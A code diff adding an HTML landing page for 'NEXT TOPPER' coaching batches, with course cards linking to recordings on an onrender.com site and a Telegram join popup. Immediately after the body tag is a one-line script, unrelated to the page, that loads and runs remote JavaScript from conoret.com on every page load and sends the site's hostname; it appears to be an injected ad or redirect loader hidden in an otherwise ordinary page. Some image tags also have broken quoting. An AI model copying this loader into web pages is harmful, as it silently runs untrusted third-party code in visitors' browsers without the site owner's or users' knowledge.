@@ -1,0 +1,860 @@
+
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adarsh pandey </title>
+    <link rel="apple-touch-icon" sizes="180x180" href="favicon_io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon_io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon_io/favicon-16x16.png">
+    <link rel="manifest" href="favicon_io/site.webmanifest">
+    <link rel="shortcut icon" href="favicon_io/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="mobile-fix.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&family=SF+Pro+Text:wght@400;500;600&display=swap');
+
+        :root {
+            --blue: #007aff;
+            --indigo: #5856d6;
+            --purple: #af52de;
+            --pink: #ff2d55;
+            --red: #ff3b30;
+            --orange: #ff9500;
+            --yellow: #ffcc00;
+            --green: #34c759;
+            --teal: #5ac8fa;
+            --cyan: #32ade6;
+            --telegram-blue: #2AABEE;
+
+            --primary-color: var(--blue);
+            --secondary-color: var(--indigo);
+            --light-gray: #f5f5f7;
+            --medium-gray: #e8e8ed;
+            --dark-gray: #86868b;
+            --text-color: #1d1d1f;
+
+            --background: #f8f9fa;
+            --card-background: #ffffff;
+            --elevated-background: #ffffff;
+            --subtle-overlay: rgba(209, 209, 214, 0.4);
+
+            --dark-background: #121212;
+            --dark-card-background: #1e1e1e;
+            --dark-text-color: #f5f5f7;
+            --dark-secondary-text: #b0b0b5;
+            --dark-border-color: #2a2a2a;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+            background-color: var(--background);
+            color: var(--text-color);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            padding: 40px 20px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        body.dark-mode { background-color: var(--dark-background); color: var(--dark-text-color); }
+
+        .container { max-width: 1200px; margin: 0 auto; }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 60px;
+            position: relative;
+        }
+
+        .theme-toggle {
+            position: relative;
+            right: 0;
+            top: 0;
+            background-color: var(--subtle-overlay);
+            border: none;
+            font-size: 1.4rem;
+            color: var(--dark-gray);
+            cursor: pointer;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .theme-toggle:hover {
+            background-color: var(--medium-gray);
+            transform: rotate(10deg);
+        }
+        .dark-mode .theme-toggle {
+            background-color: #2a2a2a;
+            color: var(--yellow);
+        }
+        .dark-mode .theme-toggle:hover {
+            background-color: #3a3a3a;
+        }
+        
+        .main-title {
+            display: flex;
+            flex-direction: row;
+            align-items: baseline;
+            gap: 15px;
+            margin-bottom: 0;
+        }
+        
+        @keyframes gradient-flow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .kunal-name {
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: 0.1em;
+            background: linear-gradient(90deg, #00bfae, #00e6d0, #00bfae);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: gradient-flow 6s ease infinite;
+        }
+        
+        .cds-journey {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: var(--text-color);
+            letter-spacing: 0.02em;
+            position: relative;
+        }
+        .dark-mode .cds-journey {
+            color: var(--dark-text-color);
+        }
+        
+        .batch-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .batch-card {
+            background-color: var(--card-background);
+            border-radius: 24px;
+            overflow: visible;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+            transition: transform 0.4s ease, box-shadow 0.4s ease;
+            position: relative;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            cursor: pointer;
+            border: 1px solid var(--medium-gray);
+            text-decoration: none;
+            color: inherit;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
+        }
+        
+        .batch-card.is-visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .dark-mode .batch-card { 
+            background-color: var(--dark-card-background); 
+            border-color: var(--dark-border-color); 
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.25); 
+        }
+
+        .batch-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 24px;
+            z-index: -1;
+            opacity: 0;
+            filter: blur(30px);
+            transition: opacity 0.4s ease;
+        }
+
+        .batch-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+        }
+        .dark-mode .batch-card:hover {
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+        }
+
+        .batch-card:hover::before {
+            opacity: 0.6;
+        }
+        
+        .card-cds-ota::before { background: var(--blue); }
+        .card-nda::before { background: var(--orange); }
+        .card-afcat::before { background: var(--green); }
+        .card-cds-math::before { background: var(--purple); }
+        .card-capf::before { background: var(--red); }
+        
+        .dark-mode .batch-card:hover::before {
+            opacity: 0.4;
+        }
+
+        .card-content-wrapper {
+            border-radius: 23px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .batch-thumbnail { height: 190px; overflow: hidden; position: relative; }
+
+        .batch-thumbnail::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.05), rgba(0,0,0,0.3));
+            z-index: 1;
+            opacity: 0.7;
+            transition: opacity 0.3s ease;
+        }
+
+        .batch-card:hover .batch-thumbnail::before { opacity: 0.4; }
+
+        .batch-thumbnail img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.8s cubic-bezier(0.165, 0.84, 0.44, 1); }
+        .batch-card:hover .batch-thumbnail img { transform: scale(1.1); }
+
+        .thumbnail-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            align-items: flex-start;
+            z-index: 2;
+            padding: 20px;
+            background: linear-gradient(to bottom, transparent 0%, rgba(0, 0, 0, 0.1) 40%, rgba(0, 0, 0, 0.6) 100%);
+            -webkit-backdrop-filter: blur(4px);
+            backdrop-filter: blur(4px);
+        }
+
+        .thumbnail-title {
+            font-family: 'SF Pro Display', sans-serif;
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 12px;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.8);
+            line-height: 1.1;
+            letter-spacing: -0.02em;
+        }
+
+        .thumbnail-button {
+            background: rgba(255, 255, 255, 0.2);
+            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        
+        .thumbnail-button:not(.live) {
+             background: rgba(0, 0, 0, 0.2);
+             border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .thumbnail-button:hover { 
+            background: rgba(255, 255, 255, 0.3); 
+            transform: translateY(-1px); 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.15); 
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 59, 48, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); }
+        }
+        
+        .thumbnail-button.live {
+            animation: pulse 2s infinite;
+        }
+        
+        .thumbnail-button.live::before { content: "●"; color: #ff3b30; font-size: 1em; margin-right: 6px; vertical-align: middle; }
+
+        .batch-content { padding: 25px; flex-grow: 1; display: flex; flex-direction: column; position: relative; z-index: 2; background: var(--card-background); }
+        .dark-mode .batch-content { background: var(--dark-card-background); }
+
+        .batch-type { font-size: 0.85rem; color: var(--dark-gray); margin-bottom: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; position: relative; display: inline-block; }
+        .dark-mode .batch-type { color: var(--dark-secondary-text); }
+        .batch-type::after { content: ''; position: absolute; width: 30px; height: 2px; background-color: currentColor; bottom: -5px; left: 0; border-radius: 2px; }
+
+        .batch-name {
+            font-family: 'SF Pro Display', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+            line-height: 1.3;
+            transition: color 0.3s ease;
+        }
+        .batch-card:hover .batch-name { color: var(--primary-color); }
+        .dark-mode .batch-card:hover .batch-name { color: var(--teal); }
+
+        .batch-year { font-size: 1rem; color: var(--dark-gray); margin-bottom: 25px; display: flex; align-items: center; }
+        .dark-mode .batch-year { color: var(--dark-secondary-text); }
+        .batch-year i { margin-right: 8px; font-size: 0.9rem; color: var(--primary-color); }
+
+        .batch-action {
+            margin-top: auto;
+            display: flex;
+            align-items: center;
+            color: var(--primary-color);
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 12px 0;
+            border-top: 1px solid var(--medium-gray);
+            transition: all 0.3s ease;
+        }
+        .dark-mode .batch-action { border-top-color: var(--dark-border-color); color: var(--teal); }
+        .batch-action i { margin-left: 8px; transition: transform 0.3s ease; }
+        
+        .batch-card:hover .batch-action i { transform: translateX(10px); }
+        .batch-card:hover .batch-action { color: var(--indigo); }
+        
+        .card-nda .batch-type::after { background-color: var(--yellow); }
+        .card-nda .batch-year i { color: var(--yellow); }
+        .card-nda:hover .batch-name { color: var(--orange); }
+        .card-nda .batch-action { color: var(--orange); }
+
+        .card-afcat .batch-type::after { background-color: var(--green); }
+        .card-afcat .batch-year i { color: var(--green); }
+        .card-afcat:hover .batch-name { color: var(--green); }
+        .card-afcat .batch-action { color: var(--green); }
+
+        .card-cds-math .batch-type::after { background-color: var(--purple); }
+        .card-cds-math .batch-year i { color: var(--purple); }
+        .card-cds-math:hover .batch-name { color: var(--purple); }
+        .card-cds-math .batch-action { color: var(--purple); }
+
+        .card-cds-ota .batch-type::after { background-color: var(--blue); }
+        .card-cds-ota .batch-year i { color: var(--blue); }
+        .card-cds-ota:hover .batch-name { color: var(--blue); }
+        .card-cds-ota .batch-action { color: var(--blue); }
+
+        .card-capf .batch-type::after { background-color: var(--red); }
+        .card-capf .batch-year i { color: var(--red); }
+        .card-capf:hover .batch-name { color: var(--red); }
+        .card-capf .batch-action { color: var(--red); }
+
+
+        /* --- NEW: TELEGRAM BANNER SECTION --- */
+        .telegram-cta-banner {
+            background: linear-gradient(135deg, var(--telegram-blue), var(--cyan));
+            border-radius: 24px;
+            padding: 40px;
+            margin-top: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 30px;
+            color: white;
+            box-shadow: 0 10px 30px rgba(42, 171, 238, 0.3);
+            /* Scroll Animation */
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
+        }
+        .dark-mode .telegram-cta-banner {
+            background: linear-gradient(135deg, var(--telegram-blue), #1c88c3);
+        }
+        
+        .telegram-cta-banner.is-visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .telegram-cta-icon i {
+            font-size: 4rem;
+            text-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        .telegram-cta-content h2 {
+            font-family: 'SF Pro Display', sans-serif;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .telegram-cta-content p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            max-width: 400px;
+        }
+
+        .telegram-cta-button {
+            background: white;
+            color: var(--telegram-blue);
+            font-family: 'SF Pro Text', sans-serif;
+            font-size: 1rem;
+            font-weight: 600;
+            padding: 14px 28px;
+            border-radius: 30px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            white-space: nowrap;
+        }
+        
+        .telegram-cta-button:hover {
+            background: var(--light-gray);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+        }
+
+
+        .footer { text-align: center; margin-top: 60px; padding-top: 20px; border-top: 1px solid var(--medium-gray); color: var(--dark-gray); font-size: 0.9rem; }
+        .dark-mode .footer { border-top-color: var(--dark-border-color); color: var(--dark-secondary-text); }
+        
+        
+        /* --- NEW: POPUP MODAL STYLES --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            -webkit-backdrop-filter: blur(8px);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        
+        .modal-overlay.show-modal {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background: var(--card-background);
+            border-radius: 24px;
+            padding: 35px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            border: 1px solid var(--medium-gray);
+            position: relative;
+            transform: scale(0.95);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .modal-overlay.show-modal .modal-content {
+            transform: scale(1);
+        }
+        .dark-mode .modal-content {
+            background: var(--dark-card-background);
+            border-color: var(--dark-border-color);
+        }
+        
+        .modal-icon i {
+            font-size: 4.5rem;
+            color: var(--telegram-blue);
+            margin-bottom: 20px;
+        }
+        
+        .modal-content h3 {
+            font-family: 'SF Pro Display', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--text-color);
+        }
+        .dark-mode .modal-content h3 {
+            color: var(--dark-text-color);
+        }
+        
+        .modal-content p {
+            font-size: 1.1rem;
+            color: var(--dark-gray);
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        .dark-mode .modal-content p {
+            color: var(--dark-secondary-text);
+        }
+        
+        .modal-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .modal-join-btn, .modal-continue-btn {
+            font-family: 'SF Pro Text', sans-serif;
+            font-size: 1rem;
+            font-weight: 600;
+            padding: 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: none;
+        }
+        
+        .modal-join-btn {
+            background-color: var(--telegram-blue);
+            color: white;
+            box-shadow: 0 4px 15px rgba(42, 171, 238, 0.3);
+        }
+        .modal-join-btn:hover {
+            background-color: #259cd3;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(42, 171, 238, 0.4);
+        }
+        
+        .modal-continue-btn {
+            background-color: var(--medium-gray);
+            color: var(--text-color);
+        }
+        .dark-mode .modal-continue-btn {
+            background-color: #2a2a2a;
+            color: var(--dark-text-color);
+        }
+        .modal-continue-btn:hover {
+            background-color: var(--subtle-overlay);
+        }
+        .dark-mode .modal-continue-btn:hover {
+            background-color: #3a3a3a;
+        }
+        
+        /* Responsive Media Queries */
+        @media (max-width: 768px) {
+            .batch-grid { grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 25px; }
+            .main-title { flex-direction: column; align-items: center; gap: 5px; }
+            .kunal-name { font-size: 1.5rem; }
+            .cds-journey { font-size: 2rem; }
+            header { flex-direction: column; gap: 20px; margin-bottom: 40px; }
+            
+            .telegram-cta-banner {
+                flex-direction: column;
+                text-align: center;
+                padding: 30px;
+            }
+            .telegram-cta-content h2 { font-size: 1.8rem; }
+            telegram-cta-content p { font-size: 1rem; }
+        }
+
+        @media (max-width: 480px) {
+            body { padding: 20px 15px 40px; }
+            .batch-grid { grid-template-columns: 1fr; gap: 30px; }
+            .kunal-name { font-size: 1.3rem; }
+            .cds-journey { font-size: 1.8rem; }
+            .batch-thumbnail { height: 180px; }
+            .modal-content { padding: 30px 25px; }
+            .modal-content h3 { font-size: 1.6rem; }
+            .modal-content p { font-size: 1rem; }
+        }
+    </style>
+</head>
+<body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+    <div class="container">
+        <header>
+            <h1 class="main-title">
+                <span class="kunal-name">Adatshpandey  </span>
+                <span class="cds-journey">NEXT TOPPER  Batches</span>
+            </h1>
+            <button id="themeToggle" class="theme-toggle" type="button">
+                <i class="fas fa-moon"></i>
+            </button>
+        </header>
+
+        <div class="batch-grid">
+            <a class="batch-card Aarambh 9th 2026 is-visible" href="https://learn-pulse-nxt.onrender.com/9" style="transition-delay: 0ms;">
+                <div class="card-content-wrapper">
+                    <div class="batch-thumbnail">
+                        <img src=https://i.ibb.co/JjzbyLgR/IMG-20251029-231019.jpg" alt="Aarambh 9th 2026">
+                        
+                    </div>
+                    <div class="batch-content"> 
+                        <div class="batch-type"></div> 
+                        <h2 class="batch-name">Aarambh 9th 2026</h2>
+                        <div class="batch-year"><i class="far fa-calendar-alt"></i> NEXT TOPPER</div>
+                        <div class="batch-action">
+                            View Recordings <i class="fas fa-arrow-right"></i>
+                    
+                        </div>
+                    </div>
+                </div>
+            </a>
+
+
+
+            <a class="batch-card Aarambh 9th 2026 is-visible" href="https://learn-pulse-nxt.onrender.com/11" style="transition-delay: 0ms;">
+                <div class="card-content-wrapper">
+                    <div class="batch-thumbnail">
+                        <img src=https://i.ibb.co/nNkxNpvG/IMG-20251029-231627.jpg" alt="">
+                        
+                    </div>
+                    <div class="batch-content">
+                        <div class="batch-type"></div>
+                        <h2 class="batch-name">Prarambh Science 2026</h2>
+                        <div class="batch-year"><i class="far fa-calendar-alt"></i> NEXT TOPPER</div>
+                        <div class="batch-action">
+                            View Recordings <i class="fas fa-arrow-right"></i>
+                    
+                        </div>
+                    </div>
+                </div>
+            </a>
+
+           
+
+
+ <a class="batch-card Aarambh 9th 2026 is-visible" href="https://learn-pulse-nxt.onrender.com/11hum" style="transition-delay: 0ms;">
+                <div class="card-content-wrapper">
+                    <div class="batch-thumbnail">
+                        <img src=https://i.ibb.co/LDBS8xz2/IMG-20251029-231805.jpg" alt="">
+                        
+                    </div>
+                    <div class="batch-content">
+                        <div class="batch-type"></div>
+                        <h2 class="batch-name">Prarambh humanities 2026</h2>
+                        <div class="batch-year"><i class="far fa-calendar-alt"></i> NEXT TOPPER</div>
+                        <div class="batch-action">
+                            View Recordings <i class="fas fa-arrow-right"></i>
+                    
+                        </div>
+                    </div>
+                </div>
+            </a>
+
+
+
+ <a class="batch-card Aarambh 9th 2026 is-visible" href="https://learn-pulse-nxt.onrender.com/10" style="transition-delay: 0ms;">
+                <div class="card-content-wrapper">
+                    <div class="batch-thumbnail">
+                        <img src="/285939929246_10th20aarambh202.webp" alt="">
+                        
+                    </div>
+                    <div class="batch-content">
+                        <div class="batch-type"></div>
+                        <h2 class="batch-name">Aarambh 10th 2026</h2>
+                        <div class="batch-year"><i class="far fa-calendar-alt"></i> NEXT TOPPER</div>
+                        <div class="batch-action">
+                            View Recordings <i class="fas fa-arrow-right"></i>
+                    
+                        </div>
+                    </div>
+                </div>
+            </a>
+
+ <a class="batch-card Aarambh 9th 2026 is-visible" href="https://learn-pulse-nxt.onrender.com/abhay" style="transition-delay: 0ms;">
+                <div class="card-content-wrapper">
+                    <div class="batch-thumbnail">
+                        <img src="/667423824369-IMG-9619.png" alt="">
+                        
+                    </div>
+                    <div class="batch-content">
+                        <div class="batch-type"></div>
+                        <h2 class="batch-name">Abhay 2025</h2>
+                        <div class="batch-year"><i class="far fa-calendar-alt"></i> NEXT TOPPER</div>
+                        <div class="batch-action">
+                            View Recordings <i class="fas fa-arrow-right"></i>
+                    
+                        </div>
+                    </div>
+                </div>
+            </a>
+ <a class="batch-card Aarambh 9th 2026 is-visible" href="https://learn-pulse-nxt.onrender.com/11eco" style="transition-delay: 0ms;">
+                <div class="card-content-wrapper">
+                    <div class="batch-thumbnail">
+                        <img src="/695788128610_11th prarambh comm app with eng (1).jpg" alt="">
+                        
+                    </div>
+                    <div class="batch-content">
+                        <div class="batch-type"></div>
+                        <h2 class="batch-name">Prarambh Commerce 2026</h2>
+                        <div class="batch-year"><i class="far fa-calendar-alt"></i> NEXT TOPPER</div>
+                        <div class="batch-action">
+                            View Recordings <i class="fas fa-arrow-right"></i>
+                    
+                        </div>
+                    </div>
+                </div>
+
+
+
+
+            </a>
+
+
+
+
+ <a class="batch-card Aarambh 9th 2026 is-visible" href="https://learn-pulse-nxt.onrender.com/aarambh" style="transition-delay: 0ms;">
+                <div class="card-content-wrapper">
+                    <div class="batch-thumbnail">
+                        <img src="IMG-20250301-094918.jpg" alt="">
+                        
+                    </div>
+                    <div class="batch-content">
+                        <div class="batch-type"></div>
+                        <h2 class="batch-name">Arrambh 2025</h2>
+                        <div class="batch-year"><i class="far fa-calendar-alt"></i> NEXT TOPPER</div>
+                        <div class="batch-action">
+                            View Recordings <i class="fas fa-arrow-right"></i>
+                    
+                        </div>
+                    </div>
+                </div>
+            </a>
+
+
+
+
+
+        </div> <div class="telegram-cta-banner is-visible" style="transition-delay: 700ms;">
+            <div class="telegram-cta-icon">
+                <i class="fab fa-telegram-plane"></i>
+            </div>
+            <div class="telegram-cta-content">
+                <h2>Join our Telegram Channel</h2>
+                <p>Get free notes, PDFs, and important notices directly on your phone.</p>
+            </div>
+            <a href="https://t.me/+JdiwtulE3y4wZjI1" target="_blank" class="telegram-cta-button">
+                Join Now
+            </a>
+        </div>
+
+        <div class="footer">
+            hard study  △ © 2025 - All Rights Reserved
+        </div>
+    </div> <div class="modal-overlay" id="telegramModal">
+        <div class="modal-content">
+            <div class="modal-icon">
+                <i class="fab fa-telegram-plane"></i>
+            </div>
+            <h3>Join Telegram</h3>
+            <p>Get all important notices, PDFs, and notes for this batch.</p>
+            <div class="modal-buttons">
+                <a href="" target="_blank" class="modal-join-btn">
+                    <i class="fab fa-telegram-plane"></i> Join Now
+                </a>
+                <button type="button" class="modal-continue-btn" id="modalContinueBtn">
+                    Continue to Batch
+                </button>
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // --- Dark mode toggle ---
+            const themeToggle = document.getElementById('themeToggle');
+            const currentTheme = localStorage.getItem('theme');
+            if (currentTheme === 'dark' || (!currentTheme && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+                document.body.classList.add('dark-mode');
+                themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
+            }
+
+            themeToggle.addEventListener('click', function() {
+                document.body.classList.toggle('dark-mode');
+                let theme = 'light';
+                let icon = '<i class="fas fa-moon"></i>';
+                if (document.body.classList.contains('dark-mode')) {
+                    theme = 'dark';
+                    icon = '<i class="fas fa-sun"></i>';
+                }
+                localStorage.setItem('theme', theme);
+                themeToggle.innerHTML = icon;
+            });
+
+            // --- Staggered Scroll Animation ---
+            const animatedElements = document.querySelectorAll('.batch-card, .telegram-cta-banner');
+            
+            animatedElements.forEach((el, index) => {
+                el.style.transitionDelay = `${index * 100}ms`;
+            });
+
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('is-visible');
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, {
+                threshold: 0.1
+            });
+
+            animatedElements.forEach(el => {
+                observer.observe(el);
+            });
+            
+            // --- NEW: TELEGRAM POPUP MODAL LOGIC ---
+            const modalOverlay = document.getElementById('telegramModal');
+            const continueBtn = document.getElementById('modalContinueBtn');
+            const batchCards = document.querySelectorAll('.batch-card');
+            let targetPageUrl = ''; // Variable to store the URL of the clicked card
+
+            batchCards.forEach(card => {
+                card.addEventListener('click', function(event) {
+                    // 1. Prevent the link from opening immediately
+                    event.preventDefault(); 
+                    
+                    // 2. Store the link this card was supposed to go to
+                    targetPageUrl = this.href; 
+                    
+                    // 3. Show the modal
+                    modalOverlay.classList.add('show-modal');
+                });
+            });
+
+            // Add click listener for the "Continue" button
+            continueBtn.addEventListener('click', function() {
+                // 1. Hide the modal
+                modalOverlay.classList.remove('show-modal');
+                
+                // 2. Now, go to the page the user originally clicked on
+                window.location.href = targetPageUrl;
+            });
+            
+            // Optional: Also close and navigate if user clicks on the background overlay
+            modalOverlay.addEventListener('click', function(event) {
+                // Check if the click is on the overlay itself, not the content inside
+                if (event.target === modalOverlay) {
+                    modalOverlay.classList.remove('show-modal');
+                    window.location.href = targetPageUrl;
+                }
+            });
+        });
+    </script>
+<div class="glasp-extension-toaster" style="display: block; width: 320px; margin: unset; padding: unset; border: unset; border-radius: unset; outline: unset; background-color: unset; box-shadow: unset; position: fixed; top: 40px; right: 24px; z-index: 9999;"></div></body><div class="glasp-extension" style="display: block; width: unset; margin: unset; padding: unset; border: unset; border-radius: unset; outline: unset; background-color: unset; box-shadow: unset; position: fixed; bottom: 16px; right: 16px; z-index: 9999;"><div class="glasp-extension" style="font-family: inherit;"></div></div><div id="smartyContainer" style="position: absolute; top: 0px; right: 0px; line-height: initial; z-index: 2147483647; width: auto; font-size: initial;"></div></html>
